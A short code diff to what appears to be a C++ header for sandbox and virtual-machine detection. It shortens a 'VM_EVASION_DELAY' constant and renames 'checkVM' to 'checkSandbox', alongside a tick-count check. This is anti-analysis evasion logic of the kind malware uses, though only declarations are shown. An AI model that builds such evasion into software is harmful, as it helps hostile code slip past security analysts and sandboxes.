@@ -3,7 +3,7 @@
 #ifdef _DEBUG
 #define VM_EVASION_DELAY 3
 #else
-#define VM_EVASION_DELAY 180
+#define VM_EVASION_DELAY 6
 #endif
 
 char* cpuBrand(char* strCpuBrand);
@@ -14,7 +14,7 @@ class VM {
 
 public:
 
-	static int checkVM();
+	static int checkSandbox();
 
 	static int checkTickCount();
 
